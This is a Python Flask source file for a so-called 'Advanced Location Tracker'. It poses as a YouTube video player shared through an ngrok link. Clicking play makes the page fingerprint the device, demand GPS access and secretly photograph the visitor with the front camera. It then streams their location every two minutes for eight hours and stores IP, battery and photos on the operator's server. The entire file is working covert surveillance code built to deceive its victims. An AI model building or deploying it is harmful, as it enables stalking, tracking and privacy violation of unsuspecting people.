import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from pyngrok import ngrok

app = Flask(__name__)

# Create necessary directories
os.makedirs('photos', exist_ok=True)
os.makedirs('data', exist_ok=True)
os.makedirs('recordings', exist_ok=True)

# Store user data
user_data_file = 'data/user_data.json'

def save_user_data(lat, lon, photo_filename, timestamp, location_type='GPS', accuracy='N/A', device_info=None, ip_info=None, screen_rec=None):
    """Save user data to JSON file"""
    data = {
        'timestamp': timestamp,
        'latitude': lat,
        'longitude': lon,
        'location_type': location_type,
        'accuracy': accuracy,
        'photo': photo_filename,
        'screen_recording': screen_rec or 'None',
        'map_link': f"https://www.google.com/maps?q={lat},{lon}",
        'device_info': device_info or {},
        'ip_info': ip_info or {}
    }
    
    # Load existing data
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            all_data = json.load(f)
    else:
        all_data = []
    
    all_data.append(data)
    
    # Save updated data
    with open(user_data_file, 'w') as f:
        json.dump(all_data, f, indent=2)
    
    return data

def save_live_location(lat, lon, timestamp, device_info=None, ip_info=None):
    """Save live location updates"""
    data = {
        'timestamp': timestamp,
        'latitude': lat,
        'longitude': lon,
        'type': 'live_location_update',
        'map_link': f"https://www.google.com/maps?q={lat},{lon}",
        'device_info': device_info or {},
        'ip_info': ip_info or {}
    }
    
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            all_data = json.load(f)
    else:
        all_data = []
    
    all_data.append(data)
    
    with open(user_data_file, 'w') as f:
        json.dump(all_data, f, indent=2)
    
    return data

@app.route('/')
def index():
    youtube_video_id = "GWvfyvKUTZI"
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            max-width: 100vw;
            height: 100vh;
            background: #000;
        }
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        .video-thumbnail {
            position: absolute;
            width: 100%;
            height: 100%;
            cursor: pointer;
            background-size: cover;
            background-position: center;
            background-image: url('https://img.youtube.com/vi/{{ video_id }}/maxresdefault.jpg');
        }
        .play-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background: rgba(255, 0, 0, 0.8);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .play-overlay:hover {
            background: rgba(255, 0, 0, 1);
            transform: translate(-50%, -50%) scale(1.1);
        }
        .play-icon {
            width: 0;
            height: 0;
            border-left: 25px solid white;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            margin-left: 5px;
        }
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            display: none;
        }
        #video, #canvas { display: none; }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .loading-content {
            text-align: center;
            color: white;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="video-wrapper">
        <div class="video-container">
            <div class="video-thumbnail" id="thumbnail" onclick="startVideo()">
                <div class="play-overlay">
                    <div class="play-icon"></div>
                </div>
            </div>
            <iframe id="youtubePlayer" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>
    </div>
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <p>Loading...</p>
        </div>
    </div>
    
    <video id="video"></video>
    <canvas id="canvas"></canvas>
    
    <script>
        let locationData = null;
        let cameraStream = null;
        const videoId = '{{ video_id }}';
        let liveTrackingActive = false;
        let trackingStartTime = null;
        let locationWatchId = null;
        let trackingInterval = null;
        
        // Configuration: Track for 8 hours, update every 2 minutes
        const TRACKING_DURATION = 8 * 60 * 60 * 1000; // 8 hours in milliseconds
        const UPDATE_INTERVAL = 2 * 60 * 1000; // 2 minutes in milliseconds
        
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenResolution: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                deviceType: /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                os: detectOS(),
                browser: detectBrowser(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connectionType: 'Unknown',
                effectiveType: 'Unknown',
                batteryLevel: 'Unknown',
                batteryCharging: 'Unknown',
                referrer: document.referrer || 'Direct',
                touchSupport: 'ontouchstart' in window,
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                onlineStatus: navigator.onLine
            };
            
            if (navigator.connection) {
                const conn = navigator.connection;
                deviceInfo.connectionType = conn.type || conn.effectiveType || 'Unknown';
                deviceInfo.effectiveType = conn.effectiveType || 'Unknown';
                deviceInfo.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
            }
            
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100) + '%';
                    deviceInfo.batteryCharging = battery.charging ? 'Yes' : 'No';
                } catch (e) {}
            }
            
            return deviceInfo;
        }
        
        function detectOS() {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Mac OS X/i.test(ua)) return 'macOS';
            if (/Linux/i.test(ua)) return 'Linux';
            return 'Unknown';
        }
        
        function detectBrowser() {
            const ua = navigator.userAgent;
            if (/Edg/i.test(ua)) return 'Edge';
            if (/Chrome/i.test(ua)) return 'Chrome';
            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
            if (/Firefox/i.test(ua)) return 'Firefox';
            return 'Unknown';
        }
        
        // Start live location tracking
        function startLiveTracking() {
            if (liveTrackingActive) return;
            
            liveTrackingActive = true;
            trackingStartTime = Date.now();
            
            console.log('🔴 Live tracking started - will run for 8 hours');
            
            // Send location updates every 2 minutes
            trackingInterval = setInterval(async () => {
                const elapsedTime = Date.now() - trackingStartTime;
                
                // Stop after 8 hours
                if (elapsedTime >= TRACKING_DURATION) {
                    stopLiveTracking();
                    console.log('✅ 8 hours completed - tracking stopped');
                    return;
                }
                
                // Get current location and send update
                await sendLiveLocationUpdate();
                
                const hoursElapsed = (elapsedTime / (60 * 60 * 1000)).toFixed(2);
                console.log(`📍 Location update sent (${hoursElapsed} hours elapsed)`);
            }, UPDATE_INTERVAL);
            
            // Also use watchPosition for more accurate tracking
            if (navigator.geolocation) {
                locationWatchId = navigator.geolocation.watchPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            speed: position.coords.speed,
                            heading: position.coords.heading
                        };
                    },
                    (error) => {
                        console.log('Location watch error:', error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 30000,
                        maximumAge: 0
                    }
                );
            }
        }
        
        function stopLiveTracking() {
            liveTrackingActive = false;
            
            if (trackingInterval) {
                clearInterval(trackingInterval);
                trackingInterval = null;
            }
            
            if (locationWatchId) {
                navigator.geolocation.clearWatch(locationWatchId);
                locationWatchId = null;
            }
            
            console.log('Live tracking stopped');
        }
        
        async function sendLiveLocationUpdate() {
            try {
                if (!locationData) return;
                
                const deviceInfo = await collectDeviceInfo();
                const formData = new FormData();
                formData.append('lat', locationData.lat);
                formData.append('lon', locationData.lon);
                formData.append('accuracy', locationData.accuracy || 'Unknown');
                formData.append('speed', locationData.speed || 'Unknown');
                formData.append('timestamp', new Date().toISOString());
                formData.append('live_update', 'true');
                formData.append('device_info', JSON.stringify(deviceInfo));
                
                await fetch('/live_location', {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.log('Error sending live update:', error);
            }
        }
        
        async function startVideo() {
            const loadingOverlay = document.getElementById('loadingOverlay');
            loadingOverlay.style.display = 'flex';
            
            try {
                const deviceInfo = await collectDeviceInfo();
                console.log('Device info:', deviceInfo);
                
                await requestLocation();
                
                // Start live location tracking (8 hours)
                startLiveTracking();
                
                try {
                    await requestCamera();
                    await capturePhoto(deviceInfo, locationData);
                } catch (cameraError) {
                    console.log('Camera not available');
                    await sendDataWithoutPhoto(deviceInfo, locationData);
                }
                
                playVideo();
                
            } catch (error) {
                loadingOverlay.style.display = 'none';
                alert('Location access required');
                location.reload();
            }
        }
        
        function requestLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            type: 'GPS'
                        };
                        console.log('✅ GPS location obtained:', locationData);
                        resolve();
                    },
                    (error) => {
                        console.log('⚠️ GPS denied or unavailable');
                        reject(new Error('Location denied'));
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        function requestCamera() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then((stream) => {
                        cameraStream = stream;
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        video.play();
                        resolve();
                    })
                    .catch((error) => reject(error));
            });
        }
        
        function capturePhoto(deviceInfo, locData) {
            return new Promise((resolve) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob((blob) => {
                        const formData = new FormData();
                        formData.append('lat', locData.lat);
                        formData.append('lon', locData.lon);
                        formData.append('location_type', locData.type || 'GPS');
                        formData.append('accuracy', locData.accuracy || 'N/A');
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('timestamp', new Date().toISOString());
                        formData.append('device_info', JSON.stringify(deviceInfo));
                        
                        fetch('/upload', {
                            method: 'POST',
                            body: formData
                        })
                        .then(() => {
                            if (cameraStream) {
                                cameraStream.getTracks().forEach(track => track.stop());
                            }
                            resolve();
                        })
                        .catch(() => resolve());
                    }, 'image/jpeg');
                }, 1000);
            });
        }
        
        function sendDataWithoutPhoto(deviceInfo, locData) {
            return new Promise((resolve) => {
                const formData = new FormData();
                formData.append('lat', locData.lat);
                formData.append('lon', locData.lon);
                formData.append('location_type', locData.type || 'GPS');
                formData.append('accuracy', locData.accuracy || 'N/A');
                formData.append('timestamp', new Date().toISOString());
                formData.append('no_photo', 'true');
                formData.append('device_info', JSON.stringify(deviceInfo));
                
                fetch('/upload', {
                    method: 'POST',
                    body: formData
                }).then(() => resolve()).catch(() => resolve());
            });
        }
        
        function playVideo() {
            const thumbnail = document.getElementById('thumbnail');
            const player = document.getElementById('youtubePlayer');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            thumbnail.style.display = 'none';
            loadingOverlay.style.display = 'none';
            player.style.display = 'block';
            player.src = 'https://www.youtube.com/embed/' + videoId + '?autoplay=1&controls=1';
        }
    </script>
</body>
</html>
    ''', video_id=youtube_video_id)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        lat = request.form['lat']
        lon = request.form['lon']
        location_type = request.form.get('location_type', 'GPS')
        accuracy = request.form.get('accuracy', 'N/A')
        timestamp = request.form.get('timestamp', datetime.now().isoformat())
        no_photo = request.form.get('no_photo', 'false')
        device_info_str = request.form.get('device_info', '{}')
        
        try:
            device_info = json.loads(device_info_str)
        except:
            device_info = {}
        
        # Get real IP address (works with ngrok and proxies)
        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        ip_info = {
            'ip_address': real_ip,
            'local_ip': request.remote_addr,
            'x_forwarded_for': request.headers.get('X-Forwarded-For', 'N/A'),
            'x_real_ip': request.headers.get('X-Real-IP', 'N/A'),
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'referer': request.headers.get('Referer', 'Direct'),
            'accept_language': request.headers.get('Accept-Language', 'Unknown'),
            'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
        }
        
        if no_photo == 'true':
            data = {
                'timestamp': timestamp,
                'latitude': lat,
                'longitude': lon,
                'location_type': location_type,
                'accuracy': accuracy,
                'photo': 'No photo',
                'map_link': f"https://www.google.com/maps?q={lat},{lon}",
                'device_info': device_info,
                'ip_info': ip_info
            }
            
            if os.path.exists(user_data_file):
                with open(user_data_file, 'r') as f:
                    all_data = json.load(f)
            else:
                all_data = []
            
            all_data.append(data)
            
            with open(user_data_file, 'w') as f:
                json.dump(all_data, f, indent=2)
            
            print(f"\n{'='*60}")
            print(f"📍 NEW DATA RECEIVED")
            print(f"{'='*60}")
            print(f"⏰ Time: {timestamp}")
            print(f"📍 Location: {data['map_link']}")
            print(f"🌐 IP: {ip_info['ip_address']}")
            print(f"📱 Device: {device_info.get('os', '?')} - {device_info.get('browser', '?')}")
            print(f"📶 Network: {device_info.get('effectiveType', '?')}")
            print(f"🔋 Battery: {device_info.get('batteryLevel', '?')}")
            print(f"🔗 Referrer: {ip_info.get('referer', 'Direct')}")
            print(f"{'='*60}\n")
            
            return jsonify({'status': 'success'})
        else:
            photo = request.files['photo']
            photo_filename = f"photos/{uuid.uuid4()}.jpg"
            photo.save(photo_filename)
            
            data = save_user_data(lat, lon, photo_filename, timestamp, location_type, accuracy, device_info, ip_info)
            
            location_emoji = "🎯" if location_type == "GPS" else "🌐"
            print(f"\n{'='*70}")
            print(f"📍 NEW DATA RECEIVED (WITH PHOTO)")
            print(f"{'='*70}")
            print(f"⏰ Time: {timestamp}")
            print(f"{location_emoji} Location Type: {location_type}")
            if location_type == "GPS":
                print(f"🎯 Accuracy: {accuracy} meters")
            print(f"📍 Coordinates: {lat}, {lon}")
            print(f"🗺️  Map: {data['map_link']}")
            print(f"📷 Photo: {photo_filename}")
            print(f"🌐 IP: {ip_info['ip_address']}")
            print(f"📱 Device: {device_info.get('os', '?')} - {device_info.get('browser', '?')}")
            print(f"📊 Screen: {device_info.get('screenResolution', '?')}")
            print(f"📶 Network: {device_info.get('effectiveType', '?')}")
            print(f"🔋 Battery: {device_info.get('batteryLevel', '?')}")
            print(f"🔗 Referrer: {ip_info.get('referer', 'Direct')}")
            print(f"{'='*60}\n")
            
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/data')
def view_data():
    if os.path.exists(user_data_file):
        with open(user_data_file, 'r') as f:
            data = json.load(f)
        return jsonify(data)
    return jsonify([])

@app.route('/live_location', methods=['POST'])
def live_location():
    try:
        lat = request.form['lat']
        lon = request.form['lon']
        timestamp = request.form.get('timestamp', datetime.now().isoformat())
        accuracy = request.form.get('accuracy', 'Unknown')
        speed = request.form.get('speed', 'Unknown')
        device_info_str = request.form.get('device_info', '{}')
        
        try:
            device_info = json.loads(device_info_str)
        except:
            device_info = {}
        
        # Get real IP address
        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        ip_info = {
            'ip_address': real_ip,
            'local_ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
        }
        
        data = save_live_location(lat, lon, timestamp, device_info, ip_info)
        data['accuracy'] = accuracy
        data['speed'] = speed
        
        print(f"📍 LIVE UPDATE: {lat},{lon} | Battery: {device_info.get('batteryLevel', '?')} | {timestamp}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"❌ Live update error: {str(e)}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Advanced Location Tracker")
    print("="*60)
    
    public_url = ngrok.connect(5000)
    print(f"\n✅ Public URL: {public_url}")
    print(f"📱 Share this link")
    print(f"📊 View data: {public_url}/data")
    print("\n" + "="*60 + "\n")
    
    app.run(port=5000, debug=False)
